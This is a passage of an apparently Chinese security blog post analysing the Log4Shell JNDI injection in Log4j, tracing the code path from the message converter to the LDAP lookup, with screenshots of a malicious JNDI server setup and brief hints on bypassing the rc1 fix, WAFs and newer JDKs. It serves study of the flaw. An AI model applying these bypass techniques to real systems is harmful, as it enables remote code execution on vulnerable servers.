class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">Interpolator</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Map&lt;String, String&gt; properties)</span> &#123;<br>        <span class="hljs-built_in">this</span>.strLookupMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-built_in">this</span>.defaultLookup = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MapLookup</span>((Map)(properties == <span class="hljs-literal">null</span> ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>() : properties));<br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;log4j&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Log4jLookup</span>());<br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;sys&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SystemPropertiesLookup</span>());<br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;env&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">EnvironmentLookup</span>());<br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;main&quot;</span>, MainMapLookup.MAIN_SINGLETON);<br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;marker&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarkerLookup</span>());<br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;java&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaLookup</span>());<br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;lower&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">LowerLookup</span>());<br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;upper&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpperLookup</span>());<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;jndi&quot;</span>, Loader.newCheckedInstanceOf(<span class="hljs-string">&quot;org.apache.logging.log4j.core.lookup.JndiLookup&quot;</span>, StrLookup.class));<br>        &#125; <span class="hljs-keyword">catch</span> (Exception | LinkageError var9) &#123;<br>            <span class="hljs-built_in">this</span>.handleError(<span class="hljs-string">&quot;jndi&quot;</span>, var9);<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;jvmrunargs&quot;</span>, Loader.newCheckedInstanceOf(<span class="hljs-string">&quot;org.apache.logging.log4j.core.lookup.JmxRuntimeInputArgumentsLookup&quot;</span>, StrLookup.class));<br>        &#125; <span class="hljs-keyword">catch</span> (Exception | LinkageError var8) &#123;<br>            <span class="hljs-built_in">this</span>.handleError(<span class="hljs-string">&quot;jvmrunargs&quot;</span>, var8);<br>        &#125;<br><br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;date&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">DateLookup</span>());<br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;ctx&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ContextMapLookup</span>());<br>        <span class="hljs-keyword">if</span> (Constants.IS_WEB_APP) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;web&quot;</span>, Loader.newCheckedInstanceOf(<span class="hljs-string">&quot;org.apache.logging.log4j.web.WebLookup&quot;</span>, StrLookup.class));<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var7) &#123;<br>                <span class="hljs-built_in">this</span>.handleError(<span class="hljs-string">&quot;web&quot;</span>, var7);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            LOGGER.debug(<span class="hljs-string">&quot;Not in a ServletContext environment, thus not loading WebLookup plugin.&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;docker&quot;</span>, Loader.newCheckedInstanceOf(<span class="hljs-string">&quot;org.apache.logging.log4j.docker.DockerLookup&quot;</span>, StrLookup.class));<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var6) &#123;<br>            <span class="hljs-built_in">this</span>.handleError(<span class="hljs-string">&quot;docker&quot;</span>, var6);<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;spring&quot;</span>, Loader.newCheckedInstanceOf(<span class="hljs-string">&quot;org.apache.logging.log4j.spring.cloud.config.client.SpringLookup&quot;</span>, StrLookup.class));<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var5) &#123;<br>            <span class="hljs-built_in">this</span>.handleError(<span class="hljs-string">&quot;spring&quot;</span>, var5);<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;kubernetes&quot;</span>, Loader.newCheckedInstanceOf(<span class="hljs-string">&quot;org.apache.logging.log4j.kubernetes.KubernetesLookup&quot;</span>, StrLookup.class));<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var3) &#123;<br>            <span class="hljs-built_in">this</span>.handleError(<span class="hljs-string">&quot;kubernetes&quot;</span>, var3);<br>        &#125; <span class="hljs-keyword">catch</span> (NoClassDefFoundError var4) &#123;<br>            <span class="hljs-built_in">this</span>.handleError(<span class="hljs-string">&quot;kubernetes&quot;</span>, var4);<br>        &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><img src="/2023/09/28/Log4Shell/image-20230928013525232-1695897805957-1-1695899839737-41.png" class="" title="image-20230928013525232"><p> 当<code>$&#123;prefix:key&#125;</code>中的<code>prefix</code>不为空的时候，<code>Interpolator</code>中的<code>lookup</code>方法就会去调用<code>prefix</code>对应的<code>StrLookup</code>的<code>lookup</code>方法去查询key所对应的内容，当<code>prefix</code>为<code>jndi</code>的时候就造成了JNDI注入：</p><img src="/2023/09/28/Log4Shell/image-20230928020051845-1695897805957-2-1695899839737-42.png" class="" title="image-20230928020051845"><img src="/2023/09/28/Log4Shell/image-20230928020841071-1695897805957-3-1695899839737-43.png" class="" title="image-20230928020841071"><p>本次漏洞关键在于转换器名称<code>msg</code>对应的插件实例<code>MessagePatternConverter</code>对于日志中的消息内容处理存在问题，在大多数场景下这部分是攻击者可控的。<code>MessagePatternConverter</code>会将日志中的消息内容为<code>$&#123;prefix:key&#125;</code>格式的字符串进行解析转换，读取环境变量。此时为jndi的方式的话，就存在漏洞。</p><p>详细流程如下，当log4j开始进行处理的时候，<code>AbstractOutputStreamAppender</code>类的<code>directEncodeEvent</code>方法先获取当前使用的布局，并调用对应的<code>encode</code>方法：</p><img src="/2023/09/28/Log4Shell/image-20230928125229635-1695899839732-24.png" class="" title="image-20230928125229635"><p>进入默认布局<code>PatternLayout</code>类的<code>encode</code>方法，<code>encode</code>调用<code>toText</code>：</p><img src="/2023/09/28/Log4Shell/image-20230928125540683-1695899839732-25.png" class="" title="image-20230928125540683"><p>toText中会获取对应的<code>serialize</code>r然后调用<code>serializer</code>的<code>toSerializable</code>方法</p><img src="/2023/09/28/Log4Shell/image-20230928125705420-1695899839732-26.png" class="" title="image-20230928125705420"><p>随后进入<code>toSerializable</code>后会在循环中使用合适的<code>converter</code>来处理传入的内容：</p><img src="/2023/09/28/Log4Shell/image-20230928135519938-1695899839732-27.png" class="" title="image-20230928135519938"><img src="/2023/09/28/Log4Shell/image-20230928140306447-1695899839732-28.png" class=""><p>继续往下跟进的时候会看到在<code>MessagePatternConverter</code>类中对传入的<code>$&#123;prefix:key&#125;</code>进行了处理，</p><img src="/2023/09/28/Log4Shell/image-20230928141108185-1695899839732-29.png" class="" title="image-20230928141108185"><p>细心的师傅们可能看到了offset&#x3D;68和count&#x3D;99这样的差别，中间差了31位的长度：</p><img src="/2023/09/28/Log4Shell/image-20230928141812113-1695899839732-30.png" class="" title="image-20230928141812113"><img src="/2023/09/28/Log4Shell/image-20230928141752845-1695899839732-31.png" class="" title="image-20230928141752845"><p>这是因为在经过了<code>formatTo</code>方法后截取了<code>$&#123;prefix:key&#125;</code>的值，所以长度减少了，我这里是31：</p><img src="/2023/09/28/Log4Shell/image-20230928142544264-1695899839733-32.png" class="" title="image-20230928142544264"><img src="/2023/09/28/Log4Shell/image-20230928142701509-1695899839733-33.png" class="" title="image-20230928142701509"><img src="/2023/09/28/Log4Shell/image-20230928142939212-1695899839733-34.png" class="" title="image-20230928142939212"><img src="/2023/09/28/Log4Shell/image-20230928143110502-1695899839733-35.png" class="" title="image-20230928143110502"><p>那么log4j截取这部分的内容做什么呢，走到这段<code>if</code>的最后流程，是一个<code>append</code>（当然前面还有个<code>substring</code>）,要append的内容就要由log4j去查找了，剩下的上面已经说过了，选取合适的<code>StrLookup</code>的<code>lookup</code>方法去查询<code>key</code>所对应的内容，最终调用<code>JndiMananger</code>中的<code>lookup</code>后调用到<code>ldap</code>的<code>lookup</code>：</p><img src="/2023/09/28/Log4Shell/image-20230928150520456-1695899839733-36.png" class="" title="image-20230928150520456"><img src="/2023/09/28/Log4Shell/image-20230928145907568-1695899839733-37.png" class="" title="image-20230928145907568"><img src="/2023/09/28/Log4Shell/image-20230928150108133-1695899839733-38.png" class="" title="image-20230928150108133"><p>这个时候我们启动一个恶意的JNDI服务，并替换地址：</p><img src="/2023/09/28/Log4Shell/image-20230928182725540-1695899839733-39.png" class="" title="image-20230928182725540"><img src="/2023/09/28/Log4Shell/image-20230928183008647-1695899839733-40.png" class="" title="image-20230928183008647"><h2 id="关于绕过"><a href="#关于绕过" class="headerlink" title="关于绕过"></a>关于绕过</h2><p>rc1的修复可以被绕过，但是需要开发人员手工开启<code>log4j2.formatMsgLookups=true</code>又或者配置文件中自己写<code>%msg&#123;lookups&#125;%n&quot;</code>类似的布局模式，但是对于学习来说还是有意义的，所以简单说下，对于开启了这些配置的log4j2-rc1，其内部仍然加了一些白名单和其他的严格检测，但是如果抛出了<code>URISyntaxException</code>异常，那么就会绕过这些限制，catch异常后重新进入前面JNDI注入的流程。</p><p>具体的修复在<a href="https://github.com/apache/logging-log4j2/commit/bac0d8a35c7e354a0d3f706569116dff6c6bd658">这里</a>感兴趣的可以去看下，因为流程基本一样，所以这里就不做复现了。</p><img src="/2023/09/28/Log4Shell/image-20230928191702796.png" class=""><p>关于WAF基本的思路就是利用log4j的迭代解析进行poc构造，不过貌似现在大家都能防住了。</p><p>关于高版本JDK的绕过思路，可以通过 <code>org.apache.naming.factory.BeanFactory</code> 等类进行绕过。</p>]]></content>
    
    
    <categories>
      
      <category>Top50VulnsToRCE_2023</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Top50VulnsToRCE_2023</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
